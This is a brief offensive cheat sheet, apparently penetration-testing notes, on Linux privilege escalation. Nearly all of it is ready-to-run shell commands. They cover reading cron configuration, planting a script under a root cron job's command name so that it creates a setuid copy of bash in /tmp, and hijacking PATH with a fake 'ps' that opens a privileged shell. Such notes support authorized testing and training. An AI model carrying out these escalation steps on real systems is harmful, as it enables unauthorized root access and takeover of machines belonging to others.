# Linux Cron Jobs & PATH Hijacking

## Cron Jobs
```bash
# View cron jobs
cat /etc/crontab
ls -la /etc/cron.d/
cat /etc/cron.d/*
crontab -l
```

### Cron Exploitation
```bash
# Check if a script runs as root that you can modify
# If $PATH is modifiable, create a script named like the cron command

# Example: If cron runs 'backup.sh' and /home/user is first in PATH:
echo '#!/bin/bash' > /home/user/backup.sh
echo 'cp /bin/bash /tmp/bash && chmod +s /tmp/bash' >> /home/user/backup.sh
chmod +x /home/user/backup.sh
# Wait for cron... then /tmp/bash -p
```

## PATH Hijacking
```bash
# Check writable directories in PATH
echo $PATH

# If /tmp is in PATH before other directories:
cd /tmp
echo '#!/bin/bash' > ps
echo '/bin/bash -p' >> ps
chmod +x ps
export PATH=/tmp:$PATH
# Now run the vulnerable binary
```
